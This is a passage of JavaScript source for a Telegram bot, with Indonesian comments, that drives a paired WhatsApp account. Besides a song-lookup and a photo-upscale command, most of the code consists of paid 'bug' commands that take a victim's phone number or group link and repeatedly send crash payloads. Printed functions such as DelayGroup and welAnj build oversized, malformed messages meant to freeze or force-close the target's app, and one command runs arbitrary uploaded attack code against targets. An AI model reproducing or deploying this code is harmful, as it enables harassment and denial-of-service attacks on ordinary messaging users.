        caption: `🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`,
        parse_mode: "Markdown"
      });
    } else {
      await ctx.reply(`🎵 *${judul}*\n🎤 *${artis}*\n🔗 [Dengar di Deezer](${link})`, { parse_mode: "Markdown" });
    }

    // Kirim audio preview jika ada
    if (preview && preview !== "null") {
      await ctx.replyWithAudio(preview, {
        title: judul,
        performer: artis,
        caption: "🎧 *Preview 30 detik*"
      });
    } else {
      await ctx.reply("⚠️ *Preview audio tidak tersedia untuk lagu ini.*", { parse_mode: "Markdown" });
    }

  } catch (err) {
    console.error(err);
    await ctx.telegram.editMessageText(ctx.chat.id, status.message_id, null, "❌ Terjadi kesalahan. Coba lagi nanti.", { parse_mode: "Markdown" }).catch(() => {
      ctx.reply("❌ Terjadi kesalahan. Coba lagi nanti.");
    });
  }
});
// ========== FOTO JADI HD (UPSCALE) ==========
// Gunakan API PicWish (gratis, tanpa API key)

bot.command("hd", async (ctx) => {
  // Cek apakah user reply ke sebuah foto
  if (!ctx.message.reply_to_message || !ctx.message.reply_to_message.photo) {
    return ctx.reply(
`📸 CARA PAKAI:\n1. Kirim foto ke bot\n2. Reply foto tersebut\n3. Ketik /hd\n\n✨ *Hasil: Foto akan di-upgrade ke resolusi lebih tinggi & lebih tajam!`
    );
  }

  const statusMsg = await ctx.reply("⏳ *Memproses foto...* (bisa makan waktu 10-20 detik mohon bersabar...)");

  try {
    // Ambil file ID foto dengan resolusi tertinggi
    const photo = ctx.message.reply_to_message.photo;
    const fileId = photo[photo.length - 1].file_id;
    const file = await ctx.telegram.getFile(fileId);
    const fileUrl = `https://api.telegram.org/file/bot${bot.token}/${file.file_path}`;

    // Download foto ke buffer
    const response = await fetch(fileUrl);
    const buffer = Buffer.from(await response.arrayBuffer());

    // Upload ke PicWish API
    const form = new FormData();
    form.append("image_file", buffer, { filename: "image.jpg" });
    form.append("type", "clean"); // "clean" = umum, "face" = wajah
    form.append("scale_factor", "4"); // 4 = 4x lebih besar

    const upscaleRes = await fetch("https://api.picwish.com/v1/photo-enhancer", {
      method: "POST",
      body: form,
    });

    const result = await upscaleRes.json();
    if (!result.image_url) throw new Error();

    // Kirim hasil
    await ctx.telegram.deleteMessage(ctx.chat.id, statusMsg.message_id);
    await ctx.replyWithPhoto(result.image_url, {
      caption: "✅ *Foto berhasil ditingkatkan kualitasnya!*",
    });
  } catch (err) {
    console.error("HD Error:", err);
    await ctx.telegram.editMessageText(
      ctx.chat.id,
      statusMsg.message_id,
      null,
      "❌ Gagal memproses foto. Coba foto lain atau coba lagi nanti."
    );
  }
});
// ================= CONNECT ================= //
bot.command("connect", checkOwner, async (ctx) => {
  try {
    if (!sock) {
      return ctx.reply("❌ Socket belum siap. Silahkan ketik /restart lalu setelah itu melakukan /connect kembali.");
    }

    if (isWhatsAppConnected && sock.user) {
      return ctx.reply("✅ WhatsApp sudah terhubung.");
    }

    if (global.pairingMessage) {
      return ctx.reply("⚠️ Pairing masih aktif, tunggu dulu.");
    }

    const args = ctx.message.text.split(" ");
    if (args.length < 2) {
      return ctx.reply("🪧 Example:\n/connect 628xxxx");
    }

    let phoneNumber = args[1].replace(/[^0-9]/g, "");

    
    if (phoneNumber.startsWith("08")) {
      phoneNumber = "62" + phoneNumber.slice(1);
    }

    
    if (phoneNumber.length < 8 || phoneNumber.length > 15) {
      return ctx.reply("❌ Nomor tidak valid.\nGunakan kode negara.\n\nExample:\n/connect 628xxxx");
    }

    await new Promise(r => setTimeout(r, 1000));

    const code = await sock.requestPairingCode(phoneNumber);
    if (!code) return ctx.reply("❌ Gagal ambil pairing code.");

    const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

    const msg = await ctx.replyWithPhoto(
  "https://files.catbox.moe/s55rn9.jpg",//ganti jadi url catbox gambar lu
      {
        caption:
`
\`\`\`js
χ-νуяℓєѕ 𝕮яαѕн - 𝙋𝘼𝙄𝙍𝙄𝙉𝙂
━━━━━━━━━━
𝙣𝙤𝙢𝙤𝙧 𝙩𝙖𝙧𝙜𝙚𝙩 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 : ${phoneNumber}
𝙠𝙤𝙙𝙚 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙡𝙪 𝙣𝙞𝙝 𝙢𝙚𝙠𝙞𝙞 : ${formattedCode}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
༒ 𝙎𝙚𝙙𝙖𝙣𝙜 𝙈𝙚𝙣𝙜𝙘𝙤𝙣𝙣𝙚𝙘𝙩 𝙆𝙚 𝙒𝙝𝙖𝙩𝙨𝘼𝙥𝙥 𝙈𝙤𝙝𝙤𝙣 𝙏𝙪𝙣𝙜𝙜𝙪 𝙎𝙚𝙗𝙚𝙣𝙩𝙖𝙧......
\`\`\`
`,
        parse_mode: "Markdown"
      }
    );

    global.pairingMessage = {
      chatId: msg.chat.id,
      messageId: msg.message_id
    };

    setTimeout(() => {
      global.pairingMessage = null;
    }, 60000);

  } catch (err) {
    console.log("Pairing error FULL:", err);
    global.pairingMessage = null;
    ctx.reply("❌ Gagal pairing, Coba lakukan /restart lalu setelah itu connect kembali!");
  }
});



// ================= KILL SESSION ================= //
bot.command("killsesi", checkOwner, async (ctx) => {
  try {
    if (sock) {
      try {
        await sock.logout();
      } catch {}
      sock = null;
    }

    const deleted = deleteSession();
    global.pairingMessage = null;

    if (deleted) {
      ctx.reply("🗑️ Session berhasil dihapus, Silahkan ketik /restart lalu setelah itu /connect kembali untuk menghubungkan Sender atau Bot");
    } else {
      ctx.reply("⚠️ Session tidak ditemukan");
    }

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Gagal hapus session ketik /restart lalu setelah itu killsesi kembali");
  }
});
/// ============= CASE BUG 9 BEBAS SPAM=============\\
bot.command("Yokskurt", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /Yokskurt 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 SEND PHOTO (FIX)
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/s55rn9.jpg", // ✅ FIX DISINI
      {
        caption: `
<blockquote><pre>💤 MODE : INVISIBLE IOS COMBO

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,

        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/fikayaw`, style: "success", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 100; r++) {
        try {
          await ZhidanKebabDelay(sock, target);
          await fcnocli(sock, target);
          await sleep(1000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }});
bot.command("DarkForce", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /DarkForce 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 SEND PHOTO (FIX)
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/s55rn9.jpg", // ✅ FIX DISINI
      {
        caption: `
<blockquote><pre>💤 MODE : INVISIBLE DELAY SPAM

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,

        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/fikayaw`, style: "success", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 10; r++) {
        try {
          FaiqForcloseClick(sock, target);
          await sleep(5000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("Delayspam", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /Delayspam 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 SEND PHOTO (FIX)
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/s55rn9.jpg", // ✅ FIX DISINI
      {
        caption: `
<blockquote><pre>💤 MODE : INVISIBLE DELAY SPAM

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,

        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "danger", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/fikayaw`, style: "danger", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 20; r++) {
        try {
        await BlankHardXbulldo(sock, target);
        await GrenDelayHarimauV2(sock, target);
        await welAnj(sock, target);
        await sleep(1000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }});
/// ============= CASE BUG 5 BEBAS SPAM=============\\\

/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("IosCrsFc", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /IosCrsFc 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 SEND PHOTO (FIX)
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/s55rn9.jpg", // ✅ FIX DISINI
      {
        caption: `
<blockquote><pre>☠️ MODE : INVISIBLE FC X IOS

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,

        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "success", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/fikayaw`, style: "primary", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 50; r++) {
        try {
          await garamMaduForceIOS(sock, target);
          await sleep(5000);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }});
/// ============= CASE BUG 5 BEBAS SPAM=============\\\
bot.command("zdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /zdelay 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 SEND PHOTO (FIX)
    await ctx.replyWithPhoto(
      "https://files.catbox.moe/s55rn9.jpg", // ✅ FIX DISINI
      {
        caption: `
<blockquote><pre>💤 MODE : INVISIBLE DELAY X BULDOZ

🤍 User   : @${ctx.from.username || "Tidak Ada"}
🎯 Target : ${q}
🔨 Type   : Status
🚀 Result : SUCCESS SEND
╘═——————————————═⬡</pre></blockquote>`,

        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "༊ 𝐂𝐇𝐄𝐊𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ༗", url: `https://wa.me/${q}`, style: "primary", icon_custom_emoji_id: "6034957065569441680" },    
{ text: "༊𝐃𝐄𝐕𝐄𝐋𝐎𝐏𝐄𝐑(ᥫ᭡)", url: `https://t.me/fikayaw`, style: "danger", icon_custom_emoji_id: "5422888130984308617" } // ❌ hapus style
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 50; r++) {
        try {
        await welAnj(sock, target);
        await GrenDelayHarimauV2(sock, target)
          await sleep(1500);
        } catch (err) {
          console.log("⚠️ TERJADI ERROR PADA SAAT MENJALANKAN COMMAND:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }});
/// CASE BUG \\\

/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("freeze", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /freeze 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 PROCESSING
    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/s55rn9.jpg" },
      {
        caption: `<pre>👾 𝐅𝐑𝐄𝐄𝐙𝐄 𝐁𝐔𝐆𝐒 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
━━━━━━━━━━━━━━━
📓NOTES : NO SPAM BUGS 
━━━━━━━━━━━━━━━
◇ 🎯 Target : ${q}
◇ ⚙️ Categories Bugs : Freeze Bugs Type 
◇ 👾 Type : Freeze Crash Chat
◇ 🦋 Command Bugs : blankandro
━━━━━━━━━━━━━━━
🚀 Initializing System... ✅ Success
⚡ Sending Payload... ✅ Success
📡 Injecting Data... ✅ Success
⚡ Executing Bug... ✅ Success
━━━━━━━━━━━━━━━
[ 🚨 SENDING IN SUCCESS 🚨 ]
Time : ${time}</pre>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "☛ 𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☚", url: `https://wa.me/${q}`, style: "danger" }
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 10; r++) {
        try {
          await BlankKebabEnaktau(sock, target);
          await KebabBlank(sock, target);
          await FrezeeGren(sock, target);
          await KebabDingin(sock, target);
        } catch (err) {
          console.log("Error send:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }
});

bot.command("ForceClick", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /ForceClick 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 PROCESSING
    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/s55rn9.jpg" },
      {
        caption: `<pre>👾 𝐅𝐎𝐑𝐂𝐋𝐎𝐒𝐄 𝐂𝐋𝐈𝐂𝐊 𝐁𝐔𝐆𝐒 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
━━━━━━━━━━━━━━━
📓NOTES : NO SPAM BUGS 
━━━━━━━━━━━━━━━
◇ 🎯 Target : ${q}
◇ ⚙️ Categories Bugs : Forclose Click
◇ 👾 Type : Forclose Click Chat
◇ 🦋 Command Bugs : ForceClick
━━━━━━━━━━━━━━━
🚀 Initializing System... ✅ Success
⚡ Sending Payload... ✅ Success
📡 Injecting Data... ✅ Success
⚡ Executing Bug... ✅ Success
━━━━━━━━━━━━━━━
[ 🚨 SENDING IN SUCCESS 🚨 ]
Time : ${time}</pre>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "☛ 𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☚", url: `https://wa.me/${q}`, style: "danger" }
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 10; r++) {
        try {
          await FaiqForcloseClick(sock, target);
          await GrenBooking(sock, target);
          await CrashClick(sock, target);
          await forclosenanz(sock, target);
        } catch (err) {
          console.log("Error send:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }
});
/// ============= CASE BUG 10 BEBAS SPAM=============\\\
bot.command("BlankClick", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  try {
    const q = ctx.message.text.split(" ")[1]; 
    if (!q) return ctx.reply("🪧 ☇ Example : /BlankClick 62xx");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const time = new Date().toLocaleTimeString("en-US", {
      hour: "numeric",
      minute: "2-digit",
      second: "2-digit",
      hour12: true
    });

    // 🚀 PROCESSING
    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/s55rn9.jpg" }, 
      {
        caption: `<pre>👾 𝐁𝐋𝐀𝐍𝐊 𝐁𝐔𝐆𝐒 𝐈𝐍𝐅𝐎𝐑𝐌𝐀𝐓𝐈𝐎𝐍
━━━━━━━━━━━━━━━
📓NOTES : NO SPAM BUGS 
━━━━━━━━━━━━━━━
◇ 🎯 Target : ${q}
◇ ⚙️ Categories Bugs : Blank Bugs Type 
◇ 👾 Type : Blank Crash Android
◇ 🦋 Command Bugs : blankandro
━━━━━━━━━━━━━━━
🚀 Initializing System... ✅ Success
⚡ Sending Payload... ✅ Success
📡 Injecting Data... ✅ Success
⚡ Executing Bug... ✅ Success
━━━━━━━━━━━━━━━
[ 🚨 SENDING IN SUCCESS 🚨 ]
Time : ${time}</pre>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "☛ 𝐂𝐇𝐄𝐂𝐊 𝐓𝐀𝐑𝐆𝐄𝐓 ☚", url: `https://wa.me/${q}`, style: "danger" }
            ]
          ]
        }
      }
    );

    // 🚀 LOOP SENDER
    (async () => {
      for (let r = 0; r < 7; r++) {
        try {
          await blank(sock, target);
          KebabDingin(sock, target);
          await FreezeByMia(sock, target);
          await blank(sock, target);
          await VnXBlankXFcClick(sock, target);
          await sleep(2000);
        } catch (err) {
          console.log("Error send:", err);
        }
      }
    })();

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi error saat menjalankan command");
  }
});

// Case tesfunc
bot.command('testfunction', checkWhatsAppConnection, checkAllPremium, async (ctx) => {
  const chatId = ctx.chat.id;
  const msg = ctx.message;

  try {      
    const args = msg.text.split(" ");
    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunction 62xxx 10 (reply function/file.js)");
    }

    const q = args[1];
    let jumlah = Math.max(0, Math.min(parseInt(args[2]) || 1, 1000));
    if (isNaN(jumlah) || jumlah <= 0) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!msg.reply_to_message) {
      return ctx.reply("❌ Reply dengan function atau file .js");
    }

    // --- BAGIAN AMBIL KODE (MIRIP TAPI SUPPORT FILE) ---
    let funcCode = "";
    if (msg.reply_to_message.document) {
        if (!msg.reply_to_message.document.file_name.endsWith('.js')) {
            return ctx.reply("❌ File harus format .js");
        }
        const fileLink = await ctx.telegram.getFileLink(msg.reply_to_message.document.file_id);
        const axios = require('axios');
        const res = await axios.get(fileLink.href);
        funcCode = res.data;
    } else if (msg.reply_to_message.text) {
        funcCode = msg.reply_to_message.text;
    } else {
        return ctx.reply("❌ Reply-nya harus teks atau file .js!");
    }

    const processMsg = await ctx.replyWithPhoto("https://files.catbox.moe/s55rn9.jpg", {
      caption: `
<blockquote><b>🌸 ⌜ Testfunction By 𝗫𝗩𝗬𝗥𝗟𝗘𝗦 ⌟ 🌸</b></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Process Bug
╘═——————————————═⬡`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "! Check", url: `https://wa.me/${q}` }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;
    const safeSock = sock;

    // --- LOGIKA WRAPPER (MIRIP PUNYA LO) ---
    const vm = require("vm");
    const sandbox = {
      console, Buffer, sock: safeSock, target, sleep,
      generateWAMessageFromContent, generateForwardMessageContent,
      generateWAMessage, prepareWAMessageMedia, proto, jidDecode, areJidsSameUser
    };
    const context = vm.createContext(sandbox);

    let fn;
    if (funcCode.includes("async function")) {
        const matchFunc = funcCode.match(/async function\s+(\w+)/);
        if (!matchFunc) return ctx.reply("❌ Function tidak valid");
        const funcName = matchFunc[1];
        const wrapper = `${funcCode}\n${funcName}`;
        fn = vm.runInContext(wrapper, context);
    } else {
        // Kalau cuma kode biasa (JS Raw)
        const wrapper = `async function tempFunc(sock, target) { 
            try { ${funcCode} } catch(e) {} 
        }; tempFunc`;
        fn = vm.runInContext(wrapper, context);
    }

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) {
          await fn(target);
        } else if (arity === 2) {
          await fn(safeSock, target);
        } else {
          await fn(safeSock, target, true);
        }
      } catch (e) {
           console.error(e);
        }
      await sleep(200);
    }

    const finalText = `
<blockquote><b>🌸 ⌜ Testfunction By 𝗫𝗩𝗬𝗥𝗟𝗘𝗦 ⌟ 🌸</b></blockquote>
▢  Target: ${q}
▢  Type: Unknown Func
▢  Status: Success Bug
╘═——————————————═⬡`;

    try {
      await ctx.telegram.editMessageCaption(chatId, processMessageId, null, finalText, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    } catch (e) {
      await ctx.replyWithPhoto("https://files.catbox.moe/s55rn9.jpg", {
        caption: finalText,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "! Check", url: `https://wa.me/${q}` }]
          ]
        }
      });
    }

  } catch (err) {
       console.error(err);
    }
});

//----------------( CASE BUG GROUP )----------------\\
// Ubah command menjadi /delaygroup dengan argumen link grup
bot.command('delaygroup', async (ctx) => {
  const chatId = ctx.chat.id;
  const senderId = ctx.from.id;
  const args = ctx.message.text.split(' ');
  if (args.length < 2) {
    return ctx.reply("❌ Gunakan: /delaygroup https://chat.whatsapp.com/xxxxx");
  }
  let inviteLink = args[1].trim();

  const whatsappGroupRegex = /(https?:\/\/)?(chat\.whatsapp\.com)\/([A-Za-z0-9]+)/;
  const matchLink = inviteLink.match(whatsappGroupRegex);
  if (!matchLink) {
    return ctx.reply("❌ Link grup WhatsApp tidak valid. Contoh: /delaygroup https://chat.whatsapp.com/abc123def");
  }

  const inviteCode = matchLink[3];
  const randomImage = getRandomImage();


  try {
    if (!sock || !isWhatsAppConnected) {
      return ctx.reply("❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /connect 62xxx");
    }

    const groupInviteInfo = await sock.groupGetInviteInfo(inviteCode).catch(() => null);
    let groupJid;
    if (groupInviteInfo && groupInviteInfo.id) {
      groupJid = groupInviteInfo.id;
    } else {
      const joinResult = await sock.groupAcceptInvite(inviteCode).catch(() => null);
      if (!joinResult) throw new Error("Gagal bergabung ke grup. Periksa link atau bot sudah menjadi anggota?");
      groupJid = joinResult;
    }

    const sentMessage = await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/s55rn9.jpg" },
      {
        caption: `
<blockquote>⬡═―—⊱ ⎧ GHOST STORM ⎭ ⊰―—═⬡
⌑ Target Group : ${inviteLink}
⌑ Type : DelayGroup
⌑ Status : Sedang prosess... 
╘═————————————————═⬡</blockquote>`,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "LIHAT GRUP", url: inviteLink }]]
        }
      }
    );

    console.log("\x1b[32m[PROCES MENGIRIM BUG]\x1b[0m TUNGGU HINGGA SELESAI");
    for (let i = 0; i <= 10000; i++) {
      await DelayGroup(sock, groupJid);
      if (i % 100 === 0) await new Promise(r => setTimeout(r, 100));
    }
    console.log("\x1b[32m[SUCCESS]\x1b[0m Bug berhasil dikirim! 🚀");

    await ctx.telegram.editMessageCaption(
      chatId,
      sentMessage.message_id,
      undefined,
      `
<blockquote>⬡═―—⊱ ⎧ GHOST STORM ⎭ ⊰―—═⬡
⌑ Target Group : ${inviteLink}
⌑ Type : DelayGroup
⌑ Status : Success... 
╘═————————————————═⬡</blockquote>`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "LIHAT GRUP", url: inviteLink }]]
        }
      }
    );

  } catch (error) {
    console.error(error);
    ctx.reply(`❌ Gagal mengirim bug: ${error.message}`);
  }
});

//------------------- ( CASE FUNC ) --------------------\\

async function DelayGroup(sock, groupJid) {
    try {
        const MsgNew = {
            groupStatusMessageV2: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: "Cinta kontol bikin sakit hati anjing🥴",
                            format: "Gren.DEFAULT"
                        },
                        nativeFlowResponseMessage: {
                            name: "cta_url",
                            paramsJson: `{"flow_cta":"${"A".repeat(800000)}"}`,
                            url: "https://mmg.whatsapp.net",
                            merchantUrl: "t.me/GrenTzy",
                            version: 3
                        },
                        extendedTextMessage: {
                            text: "B".repeat(400000) + "C".repeat(400000),
                            contextInfo: {
                                stanzaId: groupJid,
                                participant: groupJid,
                                quotedMessage: {
                                    conversation: "𑇂𑆵ꦾꦾꦾ𑆴" + "ꦾ࣯࣯".repeat(50000) + "@1".repeat(20000)
                                },
                                disappearingMode: {
                                    initiator: "CHANGED_IN_CHAT",
                                    trigger: "CHAT_SETTING"
                                },
                                stickerMessage: {
                                    paymentInviteMessage: {
                                        serviceType: 4,
                                        expiryTimestamp: Date.now() + 9007199254740991
                                    }
                                }
                            }
                        }
                    }
                }
            }
        };
        await sock.relayMessage(groupJid, MsgNew, {});
        console.log(`GrenTzy Cinta kontol successfully spammed to ${groupJid}`);
        await new Promise(resolve => setTimeout(resolve, 1500));
    } catch (e) {
        console.log("❌ Error Strike:", e);
        await new Promise(resolve => setTimeout(resolve, 5000));
    }
}

async function welAnj(sock, target) {
  try {
    const payload = {
      interactiveMessage: {
        body: { text: "\u200B".repeat(3000) },
        footer: { text: "\u200C".repeat(3000) },
        nativeFlowMessage: {
          name: "cta_flow",
          version: 3,
          buttons: [
            {
              name: "quick_reply",
              buttonParamsJson: JSON.stringify({
                display_text: "\u0000".repeat(30000),
                id: "\u600b".repeat(30000)
              })
            }
          ]
        },
        contextInfo: {
          participant: target,
          mentionedJid: [target],
          forwardingScore: 999,
          isForwarded: true
        }
      }
    }

    const msg = generateWAMessageFromContent(target, payload, {})

    for (let i = 0; i < 5; i++) {
      await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id + "_" + i,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  {
                    tag: "to",
                    attrs: { jid: target }
                  }
                ]
              }
            ]
          }
        ]
      })
    }

  } catch (err) {}
}


async function JirDelayKebab(sock, target) {
    const messageX = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "@fikayaw",
                    listType: 2,
                    buttonText: null,
                    sections: Array.from({ length: 9741 }, (_, r) => ({ 
                        title: "꧀".repeat(9741),
